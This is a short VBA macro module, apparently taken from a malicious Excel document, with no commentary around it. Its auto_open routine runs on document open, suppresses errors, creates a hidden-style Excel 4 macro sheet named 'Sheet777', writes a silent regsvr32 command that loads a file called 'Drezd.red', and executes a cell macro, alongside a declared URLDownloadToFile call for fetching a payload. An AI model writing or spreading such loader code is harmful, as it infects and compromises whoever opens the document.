Attribute VB_Name = "Module5"
Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Sub auto_open()
On Error Resume Next
Excel4IntlMacroSheets.Add.Name = "Sheet777"
Sheets("Sheet777").Visible = True
Sheets("Sheet777").Range("I17") = "regsvr32 -silent ..\Drezd.red"
Application.Run Sheets("Sheet777").Range("H1")
End Sub
